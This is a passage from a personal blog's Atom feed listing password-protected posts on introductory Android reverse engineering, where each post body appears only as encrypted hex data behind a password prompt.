c549a9cb1e7a54c8b1253bfd49958275b8bc93eaa48716a19c1f344d4aeca905b201dde2b11ca512d900bf46eed6129671a88940d44183517ffb974b737d70a6ecf319f8cc36bb3e65f08458b4918378f8b30e33534494f7dc81687b5b4abb1b62627b747c4c00df319bd3f08b3c3cba22cf9ba40ad6e9be1f12c1ee5852211eee7bd4f73e4931d9d4c37e3e59b577ec9ca7007145c54c4442e344b2b28d829cfc1402ecf11536c27bf4010be2c0084aa997db887c772ff4cece6fe9446f386bd7bc0e7a8648b75189644b148cc063bbd2871d5ef020dfcd43898ff04cef2cef</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Continue Reading...
    
    </summary>
    
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（四）</title>
    <link href="https://qianfei11.github.io/2020/02/08/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://qianfei11.github.io/2020/02/08/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2020-02-08T06:21:40.000Z</published>
    <updated>2020-02-09T08:10:38.279Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Enter Password and Continue Reading...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="7e7bcc755048681a81d307b886058c997a48654306b167cb78f1f77bdab30cde"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Continue Reading...
    
    </summary>
    
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="android" scheme="https://qianfei11.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（三）</title>
    <link href="https://qianfei11.github.io/2020/02/07/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://qianfei11.github.io/2020/02/07/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-02-07T06:06:59.000Z</published>
    <updated>2020-02-09T08:10:42.962Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Enter Password and Continue Reading...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="38ca7358ffcd63b87599b474fbed5ab7b45c291908a7f161af6170352287489a">9b4165afda21f5bbd81663dcd46a89e7027f0fc4aefe3a86a7c5df09b307422f7e38fa5b1401bfc43a866f3514877096cf266324a944c2b3396f01737269e48e6505cbfa2599b83a1895c8f12bd798c57768667b98043857356948e10a5faf5415e4180866a0fbc1af1ae579fc97958f9fdf4a840f533fcd218973d292917bf373450800ce4e12a8be9f35f7ca6fd3a9a4c5becb57d821fbcf264e8137f4d016065072077e4429d8ebd57adc3958d9288a680f99d9ae147e38f9770eafff2de586c9c2c13a948ebcee9a8f50a7357bf67265cedf29d1973a037a64eacc2c057fb0263d88caa5fda96326e0fad1a5475f1eb68e3036750fb15306817dd259142dadb9cc589e7a3966a1618f1c3c9a65aa63c1b336f4fda63f0f7f7c5bf31b16da1a0929046fb80b0aa72c0bfa494d32ed5592bd20a783706e224042a41ac2f4ef6ca143cf3ff8c411d9cf9be25eaa1e24ea01d078640ba46a6ca5b3228b73e88607c69e38675a48b2a1ba4b512c2f76723ef9eaf0757b3ab4aff073094f2696fa996e047a91fb1c74fe79bda5cbcc6ab6e5cc7fe257ec0020d36bd5756b67d5da04757ebc54cdf555407ef97d1bf2a7a22a01b8878601bc3bbdb890ce46bb7da0cf7f20c3afe502a8e52fc27c05da9f5a456127dd70bbc88e4ec56c0fca09c135846b13a9d35d07fe847bde4c1f2d7447cb7dc9ca3d196b8e9ebd447377b38cbdd5e16baa8f2202ef7b0c11e6359ddcc41533ea168c85bb81d8d25c3fc369d74a1b1630a8ccea38d01467a2250806096b5bd6bf11fb4ef32c7200aca5d88b5cdf118f41880926777acff6912b6019204ba7e8c92f05223a8dc5b751abecd6b24716e0a2a047c01f1bdd681f87d596e7f3a05f09d153b967d5156b86ebb9d49c5d0c0b72e8d4ad154e2ddd20c108558a842eb372a59e1bf938fec6b426706aa22494591a85117f7dc07b7cc8f33883df65af2e5006e94ca158c60f8fc403c8d2bf892144c91610d677c1d8c8fd6390427cd0a1d8374f8dd707206d605c67cd64c1961a544408c94738bf1014bc95ebad631b5d98e979c623f58f0639314504dbb97ce2c3b1b1d3de4b45078c0809298989bbcf93dffed862024c06c3a3e24a6d94462e78e496d6c3306edcb34e24cd27021bd27940d218ece54ed8a72dd0408b03e7b40a3390bec817a2b840b08cc8c76755b285640b4b0837db27a143540aa9badce9d182d2b64ca0bb9346dab0cd5263ff27bacf914c4159f1cb87dcec5fa6e934b13476f16aef1926bafaa4ad672facd0681a660b5b405a5f807f15a5b21955f20fa74ab99b9093b37d6988234b35c95ebe6d3770e36d55370e1c77318f2eab0011f9ccd422be931b0c1322184c733f5795742fc590361c378395c1a289bdd1fda818271d9ea796f0eb4f31f0dc9e6269789ef671b584beb50dac72ce25380a292183232e0d90210c087de0e97213eb8f06da1df31d9de7f1b080753c51425826566eb42cc598c6c2d0d22df8d62bec298ebd5197db47803e69489249fbad7f0998b0bf7a1e7db6f8b06d22391980430f14960b24562358dc07a542fa275768a08cc14c6039ba319350ae5d3ffc52cb574193246c6bb8b45c4ccc8edb196461e3387a3289ff9cd42647e4464b0a99f91d40b73e13249ea5571fd4cedc89de0773541bd2623ae676abc9b14aa004c7ff7f0498df6748eb40e20b8b51ce01839b63bc236d8cc349e63e53f476558f97aac7d62bc35938124d24aeb2e1afc79db3d984187b50d307751ed9ef545530e9ad49e1311b99a7509ce5a0a2b79e7f8a7ed1cb637c866305c1f3d94b7eb300a678da98be10cebafbe1bebdb580656010eaf90493c6268835adef23bd3222533b4dbf310f827dc67b0e39fba7818505c509f0bb871f89e745a9ad75383cecdeffcd218bdc0a7e21afec571206b1cd9d2c99bddc25a8a91411c041a2446503470820e122d1bdd7efd45180a65d74a19c7d5179868054f3d3665f97d66633f340eea75b88675f30b6c69be96ac1ca8ac20f353eec44550cbbee73a8c8f324f6590820ebe085047f0b919210a3bd2430e5853c674a348b229137e699f6748c28c1ae4fc81aa944f5827b0be3a1fb43afb19017aeea11a630e36f77659eb6e3c093f3e04ab4c63a7de41dab3c80eac0108ba30cf7a617f786d771f50e38233264af530e32cba3e62fd9ba86d9c60d960ac66dc3356b843843340c977a5febeca81a990fb1e3458df07a9d9129984487553b1f2c1cf6c8de112c457d4789ca860621b40578afb7239532b0aef72408cc92738b82cff2f857ccb6b31da816c2a418cc7604ae29d76351dd59dd25934ad3943601557ac1ff9b7c10e294e02932cc4d065909cabb8717349733258866fcbea7ad668a1ed4592f301f4d26b2dfea705b950dff5956fa9550963b64c48cea2d68097844c214e05c8ac2339fa6dc7ed634b29317d0fa6b1f78e06b8db40de894e934b7bc9c10809c5867c51e05507f9a952742c200799c287fde22cc699dea41e7d9c93a7ed1e3d62ebe962cdc71d4c892513749b72d9d25bb69c04f4ada27e4d4b3dede4237cab172ce761c7147905a2384342cfd6bf3df10f66da3eb00fe0cc6121dab3ce4fe2b56dcc96faed7307cfedc96448004abdc8ba97444c3ceafc33934b9a7b001fbfaefc9af8fd33247b075b72a34d63ada19acadc9d2c036e8b6786b79325b38f9db436d1852c58c603d6d57a0b9287ee37f2872235353013dacf3fa268669cab411cbefa49546fa423a570decfc3e2bbe6c86d557a6ef7b21e17b68e4888a887e1b4008493df06399e577827c5af65b369e8ede28b0682cf34245b4f82a1844e655f1afb60b26edf3167a0dc1b904c4f2e36e550585c8b1620d1e233d6b1c7801159dbd644683b90b1d10ab677da034e7ecd070c6a1d95382cdba49719d89c879344cf9641d8bc2d8c31bc25297989a0196cc489c745d5675c4cdfad60df7eb984d35e4d299675b944dac5d7b45b2f7cfbec91c87df86f56ef68369965f8177b10e5f079f067deb7743f708d4220879ca7f3d2ff0765c1b3dcca6e356d06bcdd77c92d0d5089ec0e4116f19a443471936de243214e7aef3007c1b7fd27bc5af696a825935759dc4c495d2a71af11f2290f4c99bbd7b380aa2cf70ee6269cf5a1e09b376ad2d171b4ebecb3e09cbfe33ab3b28db1f3dfd7925dd8bda462ec362c14005fa6bc6ad8e9a453343d5edd74ea7d7f5548a8704bd4a11c742f9469cacbd491b6ee0d4777783ade0fd13996efe24280732420762194f679221bd94dd4065747982f5a3c4e9942cab3ccb339f12ba581199818607a5c5a3eff910f76cf01a506c315e9251d662ff2e9d75da743f334c7d5222ca26a4a03849427e49645fea7526a20676afbb4cf823f2443da8159837191c4aa2c269ae2fe6fc39c55217531d24e3662fe9fd3e08be9d676d87f1f07170b2dd890f42987ca281286c4f2fa74ea72c7cad5db0fa98333ac2fd5a398f443ae32ebec851e87dc9aeb01cb94914297e8962da4fd9347b973566ea65fca0d6508712c1398f7c7ee903cbb4c1b631cbafb80fa7dbebcf050f6685cf8c832f1d7b78dfef9c1574be46204207174f2ccc1617509ce8d7705265a42bfbe857071455fba74abd57579f2447b2cb283bfe96c4bc22437f107a70aa456a3133aab841d4be841024373c3ceb69a6204d6582c83c9c596cdb3a9dca1f3675b28d3985a0a8795d8fcfa9b3976e76b39d329a49613f19e8f6d5f61b33311c6d0ef90196a915d2ec42f20d72d4e7e74ba54ccc032142f416ddb8eb0c3de939e3630823bf15813130448b4044a79fd2e21ed8cc5e6089275d849a6bf54930d15e6f52ed5f4d3e693dcd6a45d3ffc60284715e1f188269c782ec3e1b8a92d1fd3ba3aa9cca76c3cb27768701c46763c58311d0f58bbe270a5c61f55d1f682c9302502f3cb9a410bf456177f50705c736c7c89fa9e49e77b8b0effeaff059f0d9f2ac834133239a82998c5f8b83d264dcfabc3a32da0ca65b84318aee4af3401c3c630efd4396cb004e36b248eba52551bc54597a1bf0fc55d7a73fddbbe6fabd134ebec0085dbf01aea004273080559448623af85b3840196eaa33c33cca1dad761c60a204b0a9da5c751ddb7536391104d00cb1db0cae10c15e7f0eedecabae121d46091cee94a5dbd17abaf5a654f96a78032bffd0dfc37fb0ece68b7cf1f6aa6dfa1d5cdd68ed2c0d3ae0e855b21bd381e843cfe9c35157b98c32599aa1c04910d9277647bc7e4351f6b17a7c42e92bfe0f966200b396bb64012f28b39d3fc73ba0056140bf9df2265d42ffcd7f7a30da1460e3eb407f6c86e3b9bdc038d6e08e1cef8be1f4827c9132ffb3882f750cc8fd96a42cacf24010c03e855522364bc2b184f06c7d2a679a0db7359c6ffab93718bf27fb5be2d8349f9a702f75c71340450486689805c5dab7d1e98895ab16b6d51428e8b182eb7fa384605afccc92c0967d0d7fea492758143810aef52ef0259d16a03e00a42fb6f155e287d23bb38dc2360d36fa7f89f453798138971decc2e2e1f298dfd196365a0277d3016445638474045b31c6e5af50ddcd6bffe93306872f9862f4cb3a64f6e9980f58c2de0fe28912e3689498c471221ddb66aea7c553da4864732cc79e5d70c0071bf05c9606cfb96ba6792fff1e17a24d3d1264074deabae14f4b4a59f3d88d54cc97d1d98dee34442c90106199e873f1297fda5331c1fc3ceac86cc47ae3909ec42bcd21b2d0735e3557734667a6b169328d11903031e774c5af6f3acd378de4afffce3aa72349b6f99e7f1a92fed9208e39e131df375895a17f895a0996889982830af6c64794313b16707fccac5b597309c74fb1c63e6abaf5c4b6a6c564422b4e54a5af1a3c4ab7bec1814aab003cecc2fd7b0c82fb42a5df7f699195bfaa5c5634039838625be651c2d09631da1557f7af9956549d1183864096203315bbfec7e1617dcafb7017d21ec529296d2474cf25368226cdbcb74aa8d053407b8104eeeda50f3a33a17a8a47af5c1af3827fd8f25a8a67d293db051878321422551d1e7e1b0acebc0cc1398cbed09836e1e46ccc2a77a92c650ad3485ed35f6959bfc5ff59b76335c962d84220aee44220e8f3dbbbe81e6a431f17ed5fd2bdbb8c696a233b8db4e4cdd2b4a3e9d9f7269dd4529405d3ec208dcbf1b952275b0e45062277179f8e6ad74f50693afc9fc4fc851d8577096485d0da76c3ce21a37773ba07ccd437b460660aa4334253199a26b45375ee7ec3c5733379c712c1297a9c1674eff828f6d96b8a44bd5da4ecdfdbb6430dc057b9ffb8023035136bb3aa40717fbe4c6d2096e12cb6c3b68b7d27121c4ee56c353593e8067d86bf4428c4b64b4f17e4464df4a46ba58b182f227805d5bc31c3361fc88ffb02b46368350433aeea39d70e76e7e01ed775c7168759b25363dda18182f2d668eb8f2fd7c73057568f5127f633d5da012b5824135e4efead21c8c548f11957a77aee3085d8546e67e4a969230e96f7cb69c41233b192f79edaf1476814f02f5062706506767e115fc9354eb7630eda8080443a74fc3568f2ecd4b7005e9cc27f4a0a41c55942e9f4f061c36fba75f39df4e39b8f9537d4d9952c5958f2ae329d1c941ae3130cc0e8bd59bb698cc8f3b39cba42a2a3747b0cfc5811fb031169b2eea3c52bd27abfd1ceab95ed4f7adac3fc51a472ebe1ad17b52ae2d1e743ba58129bd8899c3c970f6f2711c545e689de0c120c267f91cfe0e10cf0dff0378b2fa74ac30e78ec66df17d6768a6acfb3790556b8638a8bc826432962dce0d08321af267fb52e66ce5d396fcfcb521e785ba9a9f936b68274c023f9d7a92b2c178012e4ed91f5c9e65c5776dcef7f0643d3c0020d52f3af22e97cb44f449d902e5ccef94811b5aa4aa41a680e341d4cc10a7a936e86db80d13ed46428ec6c157c71b7fe117d0b8c63fb653a33ceb22eb840bb6ac4d6908f4cfccee6f31d999e0ee2695e049b9f56c069e34680bb2b0ffc22f3eee9b59bc7632756dc6bd5094c3d6780099e350badf790df4237f67f0459bdcf1e12cdd89466781527bab31313110e70800ba372239ff6793d29bffa8f59a7a2c422011e3038d60946dca7004d6cdf00f7963f4b9dd8719311e90cdfff606c71ccf8d7aeb325889f4c0fc9f1998ce2eb1723bacbaae3ec065669a641dd296eb4f51eb2f9de5ac3138f4cef23c9d1fa4ff735d42ba610fb6598f5257bba4776cc68710e508abce33a6f5e3938acfbf9472156e12dae8dfaaf8b8c7283c6c5cd054a1ca8203f8d20458fd5ab64d07c2813ec513650c989c72e105173693255cf898501dbdbb5ee109bde7b1f9398578e9fed59553d1603fed56ee644f1b52d5953c7458b79bfaadcdbb34c4d15b711be8c7d2ca57ba7159778120ca85b897d33bec6420ee87cdae2f636176f0820694248fea5992b700d03802f295decd86faf88e7f6329b29c240e1cccc3cc7e7ee41b3976f1e5447bc3d2c6ee684b60f104f8729d5106139d056e3e789483c86b20c6c59b366561d1826fdbd7a6821d6f4b51dfa6615d7370dc4438dd47e31ca22c99ed01414bd16729086eaba07343795f4fdc64b975c4555976ac56bd4fc581ff0ae79ca21b650c31e3e6bb54efc5cbbf067e62647bebb973a6115f283b28b06cafd6579c8e08b006f1cfd92c3cf0aa5c042120942c660dfdaa4966bd6a5620a9981834a360ca8d81efd779af5338ad1983ab3ed6c58a51dd29851e135a20ee428531f5168c3df3878f043ebe7478a0a1494fbc0849abc57f29d520d337d8e14099202bb9399113fdf75fdcb120e586fb6e44eae995350ca5236bd36f7499609d5b3299a00d002631fc71a3560e7b21c5a9a9f80f4d3e6e0259872fca3a6f22325e1995b8a48ba029491a48923b010530864b43041fc94745f90a46467765e563698441139d0d26e9fe3f09eda273b497b52d32a503ad74bc8a653e3e2ab71a57da516056abb91e4e18538b0fe0e59bd80e7f2d74824a254d8ea4846661d07bfbcb1e3356cb369f6455584f43938be13e98328234804fc2f208c7d9cd293fd4a22670170d17b4866856a3aeb351acb7e5b274bbc6436d7a47815f2fba36a27315bc95d1ce21be1ea61efb25e179ae9eaf6383c4dbd8d69126fd9efe3d2eefba045c578737f998231c39822a9688b1b2fa2b673504e57b99af625e23df074061fe98c9630069cb768a3a54bd502f892be5694a8c154c4ceb0337430a1f93758f4f3a99fa8d1d830806c1f270379d9a91f4ef91eb5bb7ebcb474b2f3b885f6d9686c343f3262ee19f1a51ddb623e18e31d85cb8547c90908401a965223147641cb1349c655c3639fe43517d2faaecf1e83c7a86e51f457e272b67bf1f8f2f14a6132c62ad0dff70562a8788565669bc413b01a00de90a427b925f73a71240055351a2644eadda657bf4204669ee3e68ac3055c6c7c2eb35d32116f92a841ce7ee97b9a714ea0fdc397d386058c565835fb2e49b406257c7065d2319584e39c0ec49804a85052169e5650af7ec355592d163e24121a390265fc0e59d2c7186114d421bdfe31544276e3608e09dc2fbf7edcac2d5e0985be1d1c2f8ec8015a3f7a6948236fefcb7a12cb1edfbcf6d953e4cd377c273dad2749584c635a51ec3926dcce35cfacf28e5c9887d277c267038782effb46ae437d772bda7343348a724f76d50d606031a8ad832eca7b15dfe8cb648e5da94a4348159b9c33dcbf474029108bb692d8787bd2d9d4606d928c484f445d61d0e6029cf06204ca991a612e0bd38de7a92dd770a0e3dce48a055373d3ab92513b7e060e18f6bbc5994a38152bd4be072cd3036553054815df8c8b427b27b43a4c7f3f09ab5ac7c33e24441cd534e1ad0922e5c3ef6bf6d164419cab49bd2c7d5332fabef1e872680433e46a6efb1b97ef163f6b1d3acc651e684271dc0e0a4c3603ed0ad9c2c09c8cb67e07e38cf22b28537eb541d8bfecb6e2891856189a3fbc5c3e4bffc7dc3c7f1a54acb39b9fbdd11ceb9a25eee4bfcf9a366b1a8f80cd82946783b8735a115be5b4863c0a1e92e45cc63e9f1d52f490c5f437b20bcd6d6bc9bfacc209153ba15ae4a4f1f13109d1e77e172426163f32fc51d95f575f908c87f236d53d85887ab53585f9ae3ba62c05ddae81a1b0fb2e9189de2054118fb8c20c3bbda3cb8e2b63ee9e1dee47bb9f981320b862ddab74f94a56abb6efde057429fa9b783eb552f11541b951f98479c61a17b2d93aff04912f060106640a924b68f13fc385d88c10afcdc6a56270585c228f2eeafab0809d877c724a0012379c14880f10e37c78a673342e462a102bc94152b19fa16b362b7f29026cd6c73d359726520feba492d8128bff35cd7bda9ccaf54be799aa58046b53b8e24a3554f304cb9cad7b7ede99eb158b345e8d8bc9cb401a63917fcc54345a0a41e46aa09b752ed542b691c674810bb2bb27f3200a80cf4eb79725b8c193c5b6fd06b2cf6aa46f75e703a1bec9d2033f5f3e9a7509ae639203d9d315bf192f11b3c6f1a7e26c7e8b059bb0e796ea93c6830e1bc578b31457595075884ff1c94918d8f0259c4ec64fa86aacd77e2defd0f0c96c8b4b0be8d9cdbf8fff532c5ebea00f7bf0d12ffe2bc97f2f01216f519b5480cd47f597ed6a637472e904070ef6f371a6e49d5a17156e5b1ced68e6f4ff1ccaa20683dd66713abdca3514240546103cefb0117639db056a23ddbbcb5fa7fa208c23a0ccec62179d0f9bb832b22b6d25fb1d52b4535f771792f81dc443145b8ca2e7cf3e90c7e90b92c1a7f40d0859e50bc760c2ec992a3c98ca6362660c2254ccc05791257f0fb666eb3feeba56abbe9e159b23a16648bff6e8e5b3b5a75e6f62ddaaec272bf98cacb9ef711b7d80d71c9db981c5bbba442ecf8e847a50e0563eff7be406fddb60bdefe7f979f9c334854e82c66b97c203d6f453016130a43d14c50e7311c4fde3038c0dc468dacad7ce33fb1f8b1d10bb8fc4828444e3ebafebdae6c961418edbc7ca2079278cceb31649fad938c2a2636bc65c7bc5a673a79af8189f3b1c7e61f22ec40e8c6381d49405cac4a50acfcf28140821ac82bc0261e065a131af0585dd877c85688cb07ebcbe820a838ac7ca391337c348bcb53b28d9403fa35230d93e472e6f30aed03da26521431d52273613f8b5f5d7b547a4214047eddf36bcbfb465950cc7bde059a14b7489a91275178576fd1f9323aea47cf9e1ab6551654260cb0576d40e3c4b9decacd200b6fa2cdb02fb1fceb12afbb1bc0c922e06506a63759a9569d8a097edabf3d9b8f9f5f550ff4a66c920ab7ee113003ae7717bc49e32b9c239ad229afa92b4d03f9152f9b768c731e34ebe80bf3f840010ff7062563c780f71ef4406e302c245972f4baa47d910ebcbda3e7f83ab92e3218f786cb0d9399f3115864686dd8c84a1f68830290be1c50a19cad81c37516c7a2db20f23674286b6f270a1d675312b4b26a102dde4e7e24968a8f619b899dba12cf0d942956159d72f131f11320286827bb11dab539ae062cfc55889c24dd701af7c5d36b596c6bcfea83b8ea36d0a6e409a8152264687706629c7a82a73693c36922b6a6341b9d7a0c83b737ead60050a00455e9a6dba5097dd221a82d38f033bd2c6eff3c284b0073b3ee0a7d6416563428318d6be87fee91787ca238e7b7b4daa5c62b80278b44b0587612f286f38886dd07d19fac5daa3b867601c7d0b8d64a3073a9e8a26073039635bf542cd1fb153232262960ebd8ea39dbc63f062e16d299bd93950a7c745befe201f10484e1e2d217a50398bb6bb05274010215bc9b7176cadc99fe2af611355327451c143081a9d91f7d03340e12ae8085b151cec7de93607a341186f3b2a3e3d07f04e1059a5f65169dce34c3d8ff00b9b9878fa3c42a2732f703d01988ab680fd22f4c0b1b8dc3bb80a6a61f89d7977e5a40369b6307b9fb14bccc337ed5399591dec6efc4a6613344df50d5982abbc518085d2976ef324ca0ce112c1e8e1b6e13e0548748fc8945c845a1c1f0ee0b8f19421ba6e2afb604d1ca380ef4bd32591549d9c2b36c0ae4bb79ce83a6594e892c04d4e435e39712e6289bd7bd5b9a7a9a4f4895c10ff9a27dae62df9bea852361ad6339259a1110b84cf4bb2b3caa7860fbabd068e6fa1da9d316666641c02787fd6ee4aadb1f10b34ed4982a022999e43f13f254c2ab189da6b633ddc22865996b662cd093e80194ee0afa4b221248ea8d7964ad219e411d2cb4d2c065f3cd507d7954e5b87808197363ed6a52b4f2f72129545017441a5205d2044db14fc75d3d8c1e97ec05bc774838a2b98a9b81d28cecf4550ddb80f5e1ef7e4352af047d66df0c1930d4a25dd58bdc48f6076e68e505ac54235ba81d22a10e66bb3c2a6c3e6157f089eba2b63cc6c99e5245d932663fb5f1c462fcb0fcc8d516630c328d9d75032c83a3a44830b226f6556f7fccc32220a39cf269d7b1bc2a283beddc4410b4c84aeb8d5820b0f7d727c4de34efb334df5726e17be3b7e0f237ab6bb6201e4b4f9b73822325b5cc772f3748a1125c5d3af6086b8dea37f97f75d704b53094bde6aee37be87d25b82aee4f7de968f1f9e2ac15eda9352780e91f94e72013d2e3fbbba6b6d7e5b22c05f993602682f653b42c29f20b061e346d0e3086beac0f8209398e13714c3dfd859c1938abb740e76392b0ab62e2ed14f8b4225849dd348564f634bad06b57f6631b17f3e58075a222b84476005251e0829713952819934c5455c09c8c8f5804c778629237affb70d356b416198465378e59ebb700f544bd6f41268dbbccd23f440973b5146d661fd8d3a7923c6c2a72189e11a328a41dc74161ff9fdf7c013c76a00e4213786e780af6134f7941e6d9fc5d90906130e58841b1cb206691fbd68652026e77b2a1bf61d27ffad79d0777cc3bd6887c7ec780b3db9489eb5e06043d48c8ab9e37b70761004191a22ad0f22fa58e76fd822a4a2b1425e6d236f5c18580dd4e68d7fb90263dc21eb7d26f2f1e7bc493a318e4d751aa1dc10942ecc560eab52fa0bd3e9415ca53b132bcd77e2f9dc22b65ad34fe2e54281402ee006633087be12e04cdecc1455f7edbb1569ee8c34127d6238981c6d1b26d130c6a9d4fb21047a6746558eda416ac243d147c7b021377464f361a593f64b5c7f2c8cebf4bc0bad98185f3163d3b35ec43269c8cd2857427a7272f2c94301c7024d609d69cc783c421b50311987092da58fbfe717f51d99d77f93a93f4ed4ea0d11ec1658263c9ea5b989164ead9e92564d376a4d88c8f6a2b9b352729304011da124dd0d8787ec1d8fa4cc6a8df6aa93fbd46f313ef8f57d7d5d55d43da548b138c8f87329dcbc59ebbe5dd300a3fb3805b7c6442fccd85a833a86541e9a2717a20185dfe690b23f5354057d491ddcd40f1b7ccad491574cd96c19c3d5d49356e89c77cafcc21a11b645c1bbc28ed68154c0ef2b85d5a6f2bc3e500af7f2c93a68bf88c32515895d040219fd3efb1af8204b601b00f12f1f3ecc2a7d3d1fb0bccf779602c55fb24365c84fa0770b38acad56ea8b8b2162992bd9edac3e997c36ee7b700dd4a5e16d4b5f067354ef79006a1e35c9a8c187202dcececdfaa992ff60f953353d6feaefb6806d34ef5a915103aed40f517b6024009667be380226e0e3c8ca1be128bead785edbc2415fa8858f1acdf8e024292907f3a07c9b0eda4ecc018ccaf45e4ffec6ca7c188ce131ced38e3386b2a091f4ec2f66c13c1ef4470e7b0a4076dc88f131106f61f74b79efc4efff13b9ab976a9c149bea0c4d707f1e7c14f0900c5ba95889beee6450f8ff6545c9eb55b810fc2af59af782de758bf83e7fe7a55030ec47b1cbef490cf79cb85acfcf755afaa84df8730134dc77f0790724fc6cef6bdf6b0a7fb14fa92b4b31bb6ce11634e39a5310c6beec4398da9ccc4c1f21a0e11f0d24c9d757454be86a98d171c468538c75d491d3333923f8619a125eba4867d3badd8471045791cd4f3cccc0ad0c1cf0df4f5e4c7914ac5bcfd132038bdebfc1a69b4d83bbac93cb64a78a077b959272ab897d30ff6fe840a56e07644f79741757bac92d9816a0d7f6719d26ed763c263414e45a87c8ed92bcd52342d68b0ca39b0bd5961b3081f9b6b296443d4eb0a79d7ac13285363b59cc25844889e0a774e551f8d4cf8750412fb54ea7d1665ed78385660e774d87a4035e116e658bfa4c298b4b60b7e4681f9494c68d76afa36e69defd02bfecdd1e60055142b360da38216dd3790796670b2732e90a0f19f6c55fc71aa1e85433ad9f7176f660f788eb680d69bdd930fb068173ed8207d14a556f1757903108adf922aed00000a9e17054912f1f436e7764d37881560fc2f4f5c2f04b37500719a199580cc9d1db91947be4cb0358709918d5e9b6286f0b5aa0e46bc0582ac52ace7b90d2b5b4084e0589ef5313ce0a701396efe32d50d344186c3e00eeaa6f7eb530f12912c2f600d8a949d9d00224597394347d12b5a3c07c4874e6b3e2a4147cff5efdeca257f11779fdadd0e4d62ca561e68fc598f393753bf6dd401ee76a9884857af276623242a8f82ffbdf5bb86d8d7837494bbf3fd42a52e424f9cbde65dcaed8bab2711b25096fd71833269a781586caff39978b5e40feb92eb1dbf4bdfa92498bcb6c271f6b7e93aa842699776b8f0fd638e0b053c2b16b18a8a09a34eadd732bbe3b344f532555b339241c2b1d5ad2305749360591f581110c9bae1f671e18f1b670f149d826ccd9754598af6151e88c00c4ac75cee75a7b520831df849dc1e2ad903b99414b8e847714b023362428e6ab3f07892e3daaedb2462a9e40a2aff4e8e4f9445cf5ed6fd69a80553e4c755b0977915cc01f150efd2b98bb133401508c51ad134930edf0edd3724ed5663d953698de74c8e366c0961df802e96b476f4a33af4963fa47d879f71fca29557be714234bc3d7aebbaa546197dff5f853fa82961468745aa3734fce07912bc0883c25ac2a53802e6699b1d296620590abc702e629c72828d410666a81d23bdb8e517ad67eaf50d5ab39f13a0072ae5c3e3a9126674a529013dfe32ca390dc7c1409f891fc01169296412d025836a831e7b156bf05aa9b5b775510c80e9ce1e001126fac19c9c29df73f62239bbc831743104447cbe27d23fd64d164f268f754b13f151f5ea1fe4edd282d37a91e26bed44b99f75010080acb20d112866c2b591e3eeed40d25553c18aca4b11067b0c55418281e92700f891489319026fb2d0d9e136f420b9221c77debd57e2b1f5007009824f89ce5a06a4f8736576efa6cec1d8e60aa37684d86f15ff573980e43735e641c908a83b64258351b9d11b0c55b2d26f4f0827b86531d1fdb9274beb885b8fce16f7c8aed71e5e247867813ee8a0e87f13c9610ab41a959db669ef9d68d78fff7113a19c7f2d6a400029cbab41b6b3c6452d155dca81e560ae11c7778328067308671070508ff22679f7c72fea2cc35081fd4beeec0a17b4f1d0f2b1b8c026af0baa4a38cf9593c2968bacb7231f56af00b4837cfb26304f8f5b792ceeb2b38508e15799c1c12a44d52e5049c30d58ac5f01ba6647d11520faed5c68e081682d6b6b76b8b9e68aba3707c664736322ca9a0930c2c0ab78702e364cc55f0080e50fced2165f00f683cf474b09cb09e2c2e5d3890cd8701481fbcd64042802db161434e17b0a4709f49df1637df4e3a2a9ba6a1e649e106553d48de51eeb8372edea47b82230617dde60f18ba69cfee6fa265192974114850ba757be2ffa82e3d14b6232c6a596849fd2bba91f9407419c288cc313fb54cb6960c9eeaf2cd38888fad3dcf1d23a1c31020487a2c67d4801f0039ce610dd812eef01ee9eff8e59b0d032e4b6cbd5e1d4cb0fc2c7d51189fa3f0e88d47469e2bdf61f3734b3dd0ae1e2c64c6afd02ec3c60926f6e7e9d8329c9ef734c6e478f32cf4c234a73fca1b992343fedfddc99c1e1fc77c5e297fe30bbaef7c48b80d4ac2c7322208816fc67d6d7b2be1e79f7b176b1156787c06a5998cde580d501fe8216cccc7ef8a2aa2ffc73e9fdd2382b2315701924dce89508749587ef2e8a15e39beb5f90371dba3bd0dd13981552aaada030f428cfced2551fee2830f72e61ba063bc8e97e444d68d499732b95da70c9dcd1903fef6ec1df2a1259d22d16d0488a639c30e70180e8de967e38e628c70538e8695827547f31d5b7f2050f62ca9901cb59b2751edfaf8e88ee3d45b0f2bcfd9955ccd651d910e2769d2dd7c4d56e890fd669d61a3383cf93ca2424113f1c593261e3df81d4cf44713778b6ee7dbc0a0fcdf2a2f2bb4fa7f2599bbbc5a9535d32695e38a59eb5275255bfa6856d16c3b92e8e36ff8a3f27ef1c00a0e0e1e576d6adcc6472c4946c6411a8b77b950e88bcdcd2dce8fe53ed6309bc660445b62bef805db4d3c9fef72bbf5b05afdcfd2bd5e17dcd63b4e19c39e31679c8c2eb28255d3c04956d99818c7e69a6aca61d5e